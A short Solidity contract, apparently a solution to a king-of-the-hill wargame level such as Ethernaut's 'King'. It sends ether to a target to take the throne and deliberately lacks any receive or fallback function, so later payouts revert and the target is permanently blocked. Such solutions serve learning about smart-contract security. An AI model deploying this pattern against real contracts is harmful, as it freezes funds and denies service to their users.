// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";

contract AttackKing {

  constructor(address payable to) public payable {
    (bool success, ) = address(to).call{value: msg.value}("");
    require(success, "we are not the new king");
  }

}
